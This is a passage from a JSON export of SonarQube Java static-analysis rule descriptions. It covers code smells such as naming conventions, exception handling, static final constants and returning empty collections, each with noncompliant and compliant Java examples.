Compliant\n}\n</pre>\n<p>or using Guava <code>ImmutableMap.of</code>:</p>\n<pre>\nclass MyClass {\n  private static final Map&lt;String, String&gt; MY_MAP = com.google.common.collect.ImmutableMap.of(\"a\", \"b\");   // Compliant\n}\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/java-static-instance-initializer-blocks\">Static vs. Instance Initializer Block in Java</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1171","summary":"Only static class initializers should be used","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Making a <code>public</code> constant just <code>final</code> as opposed to <code>static final</code> leads to duplicating its value for every\ninstance of the class, uselessly increasing the amount of memory required to execute the application.</p>\n<p>Further, when a non-<code>public</code>, <code>final</code> field isnât also <code>static</code>, it implies that different instances can have\ndifferent values. However, initializing a non-<code>static final</code> field in its declaration forces every instance to have the same value. So such\nfields should either be made <code>static</code> or initialized in the constructor.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Myclass {\n  public final int THRESHOLD = 3;\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class Myclass {\n  public static final int THRESHOLD = 3;    // Compliant\n}\n</pre>\n<h3>Exceptions</h3>\n<p>No issues are reported on final fields of inner classes whose type is not a primitive or a String. Indeed according to the Java specification:</p>\n<blockquote>\n  <p>An inner class is a nested class that is not explicitly or implicitly declared static. Inner classes may not declare static initializers (Â§8.7)\n  or member interfaces. Inner classes may not declare static members, unless they are compile-time constant fields (Â§15.28).</p>\n</blockquote>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1170","summary":"Public constants and fields initialized at declaration should be \"static final\" rather than merely \"final\"","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>Local variables and method parameters should be named consistently to communicate intent and improve maintainability. Rename your local variable or\nmethod parameter to follow your projectâs naming convention to address this issue.</p>\n<h2>Why is this an issue?</h2>\n<p>A naming convention in software development is a set of guidelines for naming code elements like variables, functions, and classes.<br> Local\nvariables and method parameters hold the meaning of the written code. Their names should be meaningful and follow a consistent and easily recognizable\npattern.<br> Adhering to a consistent naming convention helps to make the code more readable and understandable, which makes it easier to maintain and\ndebug. It also ensures consistency in the code, especially when multiple developers are working on the same project.</p>\n<p>This rule checks that local variable and method parameter names match a provided regular expression.</p>\n<h3>What is the potential impact?</h3>\n<p>Inconsistent naming of local variables and method parameters can lead to several issues in your code:</p>\n<ul>\n  <li> <strong>Reduced Readability</strong>: Inconsistent local variable and method parameter names make the code harder to read and understand;\n  consequently, it is more difficult to identify the purpose of each variable, spot errors, or comprehend the logic. </li>\n  <li> <strong>Difficulty in Identifying Variables</strong>: The local variables and method parameters that donât adhere to a standard naming\n  convention are challenging to identify; thus, the coding process slows down, especially when dealing with a large codebase. </li>\n  <li> <strong>Increased Risk of Errors</strong>: Inconsistent or unclear local variable and method parameter names lead to misunderstandings about\n  what the variable represents. This ambiguity leads to incorrect assumptions and, consequently, bugs in the code. </li>\n  <li> <strong>Collaboration Difficulties</strong>: In a team setting, inconsistent naming conventions lead to confusion and miscommunication among\n  team members. </li>\n  <li> <strong>Difficulty in Code Maintenance</strong>: Inconsistent naming leads to an inconsistent codebase. The code is difficult to understand,\n  and making changes feels like refactoring constantly, as you face different naming methods. Ultimately, it makes the codebase harder to maintain.\n  </li>\n</ul>\n<p>In summary, not adhering to a naming convention for local variables and method parameters can lead to confusion, errors, and inefficiencies, making\nthe code harder to read, understand, and maintain.</p>\n<h3>Exceptions</h3>\n<p>Loop counters are ignored by this rule.</p>\n<pre>\nfor (int i_1 = 0; i_1 &lt; limit; i_1++) {  // Compliant\n  // ...\n}\n</pre>\n<p>as well as one-character <code>catch</code> variables:</p>\n<pre>\ntry {\n//...\n} catch (Exception e) { // Compliant\n}\n</pre>\n<h2>How to fix it</h2>\n<p>First, familiarize yourself with the particular naming convention of the project in question. Then, update the name to match the convention, as\nwell as all usages of the name. For many IDEs, you can use built-in renaming and refactoring features to update all usages at once.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class MyClass {\n    public void doSomething(int myParam) {\n      int LOCAL;    // Noncompliant\n      // ...\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class MyClass {\n    public void doSomething(int my_param) {\n      int local;\n      // ...\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Oracle - <a href=\"https://www.oracle.com/java/technologies/javase/codeconventions-namingconventions.html\">Java SE Naming Conventions</a> </li>\n  <li> Geeksforgeeks - <a href=\"https://www.geeksforgeeks.org/java-naming-conventions/\">Java Naming Conventions</a> </li>\n  <li> Wikipedia - <a href=\"https://en.wikipedia.org/wiki/Naming_convention_(programming)\">Naming Convention (programming)</a> </li>\n</ul>\n<h3>Related rules</h3>\n<ul>\n  <li> {rule:java:S100} - Method names should comply with a naming convention </li>\n  <li> {rule:java:S101} - Class names should comply with a naming convention </li>\n  <li> {rule:java:S114} - Interface names should comply with a naming convention </li>\n  <li> {rule:java:S115} - Constant names should comply with a naming convention </li>\n  <li> {rule:java:S116} - Field names should comply with a naming convention </li>\n  <li> {rule:java:S118} - Abstract class names should comply with a naming convention </li>\n  <li> {rule:java:S119} - Type parameter names should comply with a naming convention </li>\n  <li> {rule:java:S120} - Package names should comply with a naming convention </li>\n  <li> {rule:java:S1312} - Loggers should be \"private static final\" and should share a naming convention </li>\n  <li> {rule:java:S3008} - Static non-final field names should comply with a naming convention </li>\n  <li> {rule:java:S3577} - Test classes should comply with a naming convention </li>\n  <li> {rule:java:S3578} - Test methods should comply with a naming convention </li>\n  <li> {rule:java:S4174} - Local constants should follow naming conventions for constants </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-117","summary":"Local variable and method parameter names should comply with a naming convention","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Returning <code>null</code> instead of an actual array, collection or map forces callers of the method to explicitly test for nullity, making them\nmore complex and less readable.</p>\n<p>Moreover, in many cases, <code>null</code> is used as a synonym for empty.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic static List&lt;Result&gt; getAllResults() {\n  return null;                             // Noncompliant\n}\n\npublic static Result[] getResults() {\n  return null;                             // Noncompliant\n}\n\npublic static Map&lt;String, Object&gt; getValues() {\n  return null;                             // Noncompliant\n}\n\npublic static void main(String[] args) {\n  Result[] results = getResults();\n  if (results != null) {                   // Nullity test required to prevent NPE\n    for (Result result: results) {\n      /* ... */\n    }\n  }\n\n  List&lt;Result&gt; allResults = getAllResults();\n  if (allResults != null) {                // Nullity test required to prevent NPE\n    for (Result result: allResults) {\n      /* ... */\n    }\n  }\n\n  Map&lt;String, Object&gt; values = getValues();\n  if (values != null) {                   // Nullity test required to prevent NPE\n    values.forEach((k, v) -&gt; doSomething(k, v));\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic static List&lt;Result&gt; getAllResults() {\n  return Collections.emptyList();          // Compliant\n}\n\npublic static Result[] getResults() {\n  return new Result[0];                    // Compliant\n}\n\npublic static Map&lt;String, Object&gt; getValues() {\n  return Collections.emptyMap();           // Compliant\n}\n\npublic static void main(String[] args) {\n  for (Result result: getAllResults()) {\n    /* ... */\n  }\n\n  for (Result result: getResults()) {\n    /* ... */\n  }\n\n  getValues().forEach((k, v) -&gt; doSomething(k, v));\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/aNYxBQ\">CERT, MSC19-C.</a> - For functions that return an array, prefer returning an empty array\n  over a null value </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/JzZGBQ\">CERT, MET55-J.</a> - Return an empty array or collection instead of a null value for\n  methods that return an array or collection </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"partial","ruleKey":"RSPEC-1168","summary":"Empty arrays and collections should be returned instead of null","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When handling a caught exception, the original exceptionâs message and stack trace should be logged or passed forward.</p>\n<h3>Noncompliant code example</h3>\n<pre>\ntry {\n  /* ... */\n} catch (Exception e) {   // Noncompliant - exception is lost\n  LOGGER.info(\"context\");\n}\n\ntry {\n  /* ... */\n} catch (Exception e) {  // Noncompliant - exception is lost (only message is preserved)\n  LOGGER.info(e.getMessage());\n}\n\ntry {\n  /* ... */\n} catch (Exception e) {  // Noncompliant - original exception is lost\n  throw new RuntimeException(\"context\");\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\ntry {\n  /* ... */\n} catch (Exception e) {\n  LOGGER.info(e);  // exception is logged\n}\n\ntry {\n  /* ... */\n} catch (Exception e) {\n  throw new RuntimeException(e);   // exception stack trace is propagated\n}\n\ntry {\n  /* ... */\n} catch (RuntimeException e) {\n  doSomething();\n  throw e;  // original exception passed forward\n} catch (Exception e) {\n  throw new RuntimeException(e);  // Conversion into unchecked exception is also allowed\n}\n</pre>\n<h3>Exceptions</h3>\n<p><code>InterruptedException</code>, <code>NumberFormatException</code>, <code>DateTimeParseException</code>, <code>ParseException</code> and\n<code>MalformedURLException</code> exceptions are arguably used to indicate nonexceptional outcomes. Similarly, handling\n<code>NoSuchMethodException</code> is often required when dealing with the Java reflection API.</p>\n<p>Because they are part of Java, developers have no choice but to deal with them. This rule does not verify that those particular exceptions are\ncorrectly handled.</p>\n<pre>\nint myInteger;\ntry {\n  myInteger = Integer.parseInt(myString);\n} catch (NumberFormatException e) {\n  // It is perfectly acceptable to not handle \"e\" here\n  myInteger = 0;\n}\n</pre>\n<p>Furthermore, no issue will be raised if the exception message is logged with additional information, as it shows that the developer added some\ncontext to the error message.</p>\n<pre>\ntry {\n  /* ... */\n} catch (Exception e) {\n  String message = \"Exception raised while authenticating user: \" + e.getMessage();\n  LOGGER.warn(message); // Compliant - exception message logged with some contextual information\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\">Top 10 2021 Category A9 - Security Logging and\n  Monitoring Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring\">Top 10 2017 Category A10 -\n  Insufficient Logging &amp; Monitoring</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/xDdGBQ\">CERT, ERR00-J.</a> - Do not suppress or ignore checked exceptions </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/778\">CWE-778 - Insufficient Logging</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1166","summary":"Exception handlers should preserve the original exceptions","tags":["cwe","error-handling","cert","suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When a class has all <code>final</code> fields, the compiler ensures that the objectâs state remains constant. It also enforces a clear design\nintent of immutability, making the class easier to reason about and use correctly.</p>\n<p>Exceptions are meant to represent the applicationâs state at the point at which an error occurred. Making all fields in an <code>Exception</code>\nclass <code>final</code> ensures that these class fields do not change after initialization.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class MyException extends Exception {\n\n  private int status;                        // Noncompliant\n\n  public MyException(String message) {\n    super(message);\n  }\n\n  public int getStatus() {\n    return status;\n  }\n\n  public void setStatus(int status) {\n    this.status = status;\n  }\n\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class MyException extends Exception {\n\n  private final int status;                  // Compliant\n\n  public MyException(String message, int status) {\n    super(message);\n    this.status = status;\n  }\n\n  public int getStatus() {\n    return status;\n  }\n\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> Effective Java 3rd Edition, Joshua Bloch - Exceptions - Item 76 : Strive for failure atomicity </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1165","summary":"Exception classes should have final fields","tags":["error-handling"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>If an exception is already being thrown within the <code>try</code> block or caught in a <code>catch</code> block, throwing another exception in\nthe <code>finally</code> block will override the original exception. This means that the original exceptionâs message and stack trace will be lost,\npotentially making it challenging to diagnose and troubleshoot the root cause of the problem.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\ntry {\n  /* some work which end up throwing an exception */\n  throw new IllegalArgumentException();\n} finally {\n  /* clean up */\n  throw new RuntimeException();       // Noncompliant; masks the IllegalArgumentException\n}\n</pre>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\ntry {\n  /* some work which end up throwing an exception */\n  throw new IllegalArgumentException();\n} finally {\n  /* clean up */\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/FTZGBQ\">CERT, ERR05-J.</a> - Do not let checked exceptions escape from a finally block </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-1163","summary":"Exceptions should not be thrown in finally blocks","tags":["error-handling","cert","suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The purpose of checked exceptions is to ensure that errors will be dealt with, either by propagating them or by handling them, but some believe\nthat checked exceptions negatively impact the readability of source code, by spreading this error handling/propagation logic everywhere.</p>\n<p>This rule verifies that no method throws a new checked exception.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void myMethod1() throws CheckedException {\n  ...\n  throw new CheckedException(message);   // Noncompliant\n  ...\n  throw new IllegalArgumentException(message); // Compliant; IllegalArgumentException is unchecked\n}\n\npublic void myMethod2() throws CheckedException {  // Compliant; propagation allowed\n  myMethod1();\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1162","summary":"Checked exceptions should not be thrown","tags":["error-handling"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>While not mandatory, using the <code>@Override</code> annotation on compliant methods improves readability by making it explicit that methods are\noverridden.</p>\n<p>A compliant method either overrides a parent method or implements an interface or abstract method.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass ParentClass {\n  public boolean doSomething(){/*...*/}\n}\nclass FirstChildClass extends ParentClass {\n  public boolean doSomething(){/*...*/}  // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass ParentClass {\n  public boolean doSomething(){/*...*/}\n}\nclass FirstChildClass extends ParentClass {\n  @Override\n  public boolean doSomething(){/*...*/}  // Compliant\n}\n</pre>\n<h3>Exceptions</h3>\n<p>This rule does not raise issues when overriding methods from <code>Object</code> (eg: <code>equals()</code>, <code>hashCode()</code>,\n<code>toString()</code>, â¦â).</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1161","summary":"\"@Override\" should be used on overriding and implementing methods","tags":["bad-practice"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Using checked exceptions forces method callers to deal with errors, either by propagating them or by handling them. Throwing exceptions makes them\nfully part of the API of the method.</p>\n<p>But to keep the complexity for callers reasonable, methods should not throw more than one kind of checked exception.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void delete() throws IOException, SQLException {      // Noncompliant\n  /* ... */\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void delete() throws SomeApplicationLevelException {\n  /* ... */\n}\n</pre>\n<h3>Exceptions</h3>\n<p>Overriding methods are not checked by this rule and are allowed to throw several checked exceptions.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1160","summary":"Public methods should throw at most one checked exception","tags":["error-handling"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>A naming convention in software development is a set of guidelines for naming code elements like variables, functions, and classes.</p>\n<p>The goal of a naming convention is to make the code more readable and understandable, which makes it easier to maintain and debug. It also ensures\nconsistency in the code, especially when multiple developers are working on the same project.</p>\n<p>This rule checks that field names match a provided regular expression.</p>\n<p>Using the regular expression <code>^[a-z][a-zA-Z0-9]*$</code>, the noncompliant code below:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass MyClass {\n   private int my_field;\n}\n</pre>\n<p>Should be replaced with:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass MyClass {\n   private int myField;\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Oracle - <a href=\"https://www.oracle.com/java/technologies/javase/codeconventions-namingconventions.html\">Java SE Naming Conventions</a> </li>\n  <li> Geeksforgeeks - <a href=\"https://www.geeksforgeeks.org/java-naming-conventions/\">Java Naming Conventions</a> </li>\n  <li> Wikipedia - <a href=\"https://en.wikipedia.org/wiki/Naming_convention_(programming)\">Naming Convention (programming)</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-116","summary":"Field names should comply with a naming convention","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Creating temporary primitive wrapper objects only for <code>String</code> conversion or the use of the <code>compareTo()</code> method is\ninefficient.</p>\n<p>Instead, the static <code>toString()</code> or <code>compare()</code> method of the primitive wrapper class should be used.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprivate int isZero(int value){\n    return Integer.valueOf(value).compareTo(0); // Noncompliant\n}\nprivate String convert(int value){\n    return Integer.valueOf(value).toString(); // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprivate int isZero(int value){\n    return Integer.compare(value, 0); // Compliant\n}\nprivate String convert(int value){\n    return Integer.toString(value); // Compliant\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1158","summary":"Primitive wrappers should not be instantiated only for \"toString\" or \"compareTo\" calls","tags":["clumsy","performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Using <code>toLowerCase()</code> or <code>toUpperCase()</code> to make case insensitive comparisons is inefficient because it requires the creation\nof temporary, intermediate <code>String</code> objects.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprivate void compareStrings(String foo, String bar){\n    boolean result1 = foo.toUpperCase().equals(bar);               // Noncompliant\n    boolean result2 = foo.equals(bar.toUpperCase());               // Noncompliant\n    boolean result3 = foo.toLowerCase().equals(bar.toLowerCase()); // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprivate void compareStrings(String foo, String bar){\n    boolean result1 = foo.equalsIgnoreCase(bar);                    // Compliant\n}\n</pre>\n<h3>Exceptions</h3>\n<p>No issue will be raised when a locale is specified because the result could be different from <code>equalsIgnoreCase()</code>. (e.g.: using the\nTurkish locale)</p>\n<pre>\nprivate void compareStrings(String foo, String bar, java.util.Locale locale){\n    boolean result1 = foo.toUpperCase(locale).equals(bar);         // Compliant\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1157","summary":"Case insensitive string comparisons should be made without intermediate upper or lower casing","tags":["clumsy","performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When you call <code>isEmpty()</code>, it clearly communicates the codeâs intention, which is to check if the collection is empty. Using\n<code>size() == 0</code> for this purpose is less direct and makes the code slightly more complex.</p>\n<p>Moreover, depending on the implementation, the <code>size()</code> method can have a time complexity of <code>O(n)</code> where <code>n</code> is\nthe number of elements in the collection. On the other hand, <code>isEmpty()</code> simply checks if there is at least one element in the collection,\nwhich is a constant time operation, <code>O(1)</code>.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class MyClass {\n  public void doSomething(Collection&lt;String&gt; myCollection) {\n    if (myCollection.size() == 0) { // Noncompliant\n      doSomethingElse();\n    }\n  }\n}\n</pre>\n<p>Prefer using <code>isEmpty()</code> to test for emptiness over <code>size()</code>.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class MyClass {\n  public void doSomething(Collection&lt;String&gt; myCollection) {\n    if (myCollection.isEmpty()) {\n      doSomethingElse();\n    }\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1155","summary":"\"Collection.isEmpty()\" should be used to test for emptiness","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Appending <code>String.valueOf()</code> to a <code>String</code> decreases the code readability.</p>\n<p>The argument passed to <code>String.valueOf()</code> should be directly appended instead.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nString message = \"Output is \" + String.valueOf(12);\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nString message = \"Output is \" + 12;\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1153","summary":"\"String.valueOf()\" should not be appended to a \"String\"","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The <code>switch</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>case</code>\nclause contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the\n<code>case</code> clause should be extracted into a dedicated method.</p>\n<h3>Noncompliant code example</h3>\n<p>With the default threshold of 5:</p>\n<pre>\nswitch (myVariable) {\n  case 0: // Noncompliant: 6 lines till next case\n    methodCall1(\"\");\n    methodCall2(\"\");\n    methodCall3(\"\");\n    methodCall4(\"\");\n    break;\n  case 1:\n  ...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nswitch (myVariable) {\n  case 0:\n    doSomething()\n    break;\n  case 1:\n  ...\n}\n...\nprivate void doSomething(){\n    methodCall1(\"\");\n    methodCall2(\"\");\n    methodCall3(\"\");\n    methodCall4(\"\");\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1151","summary":"\"switch case\" clauses should not have too many lines of code","tags":["brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>As documented in <code>Enumeration</code> 's Javadoc, you should favor the <code>Iterator</code> interface over <code>Enumeration</code>.\n<code>Iterator</code> offers a similar contract to <code>Enumeration</code> with the addition of a method for removal and shorter method names.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class MyClass implements Enumeration {  // Noncompliant\n  /* ... */\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class MyClass implements Iterator {     // Compliant\n  /* ... */\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/Enumeration.html\">docs.oracle.com</a> - Enumeration </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1150","summary":"\"Enumeration\" should not be implemented","tags":["obsolete"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>Constants should be named consistently to communicate intent and improve maintainability. Rename your constants to follow your projectâs naming\nconvention to address this issue.</p>\n<h2>Why is this an issue?</h2>\n<p>Constants are variables whose value does not change during the runtime of a program after initialization. Oftentimes, constants are used in\nmultiple locations across different subroutines.</p>\n<p>It is important that the names of constants follow a consistent and easily recognizable pattern. This way, readers immediately understand that the\nreferenced value does not change, which simplifies debugging.</p>\n<p>Or, in the case of primitive constants, that accessing the constant is thread-safe.</p>\n<p>This rule checks that all constant names match a given regular expression.</p>\n<h3>What is the potential impact?</h3>\n<p>Ignoring the naming convention for constants makes the code less readable since constants and variables are harder to tell apart. Code that is hard\nto understand is also difficult to maintain between different team members.</p>\n<h2>How to fix it</h2>\n<p>First, familiarize yourself with the particular naming convention of the project in question. Then, update the name of the constant to match the\nconvention, as well as all usages of the name. For many IDEs, you can use built-in renaming and refactoring features to update all usages of a\nconstant at once.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The following example assumes that constant names should match the default regular expression <code>^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$</code>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class MyClass {\n  public static final float pi = 3.14159f; // Noncompliant: Constant is not capitalized\n\n  void myMethod() {\n    System.out.println(pi);\n  }\n}\n\npublic enum MyEnum {\n  optionOne, // Noncompliant\n  optionTwo; // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class 